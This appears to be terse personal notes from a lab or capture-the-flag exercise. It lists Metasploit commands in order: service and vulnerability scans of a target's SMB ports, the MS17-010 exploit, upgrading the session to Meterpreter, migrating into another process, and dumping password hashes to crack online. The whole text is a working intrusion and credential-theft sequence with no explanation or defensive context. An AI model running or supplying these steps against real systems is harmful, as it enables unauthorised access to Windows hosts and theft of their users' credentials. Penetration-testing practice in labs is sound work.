``` bash
msfconsole

workspace -a eb

db_nmap 10.49.176.135 -sV -p1-1000

b_nmap 10.49.176.135 -sV -p135,139,445 --script vuln

search ms17

use 0

hosts -R

run

BACK (CTRL+Z)

search shell_to_meterpreter

use 0

set SESSION 1

run

sessions -i 2

ps

migrate 3020

hashdump

#crack pw crackstation

#find files


```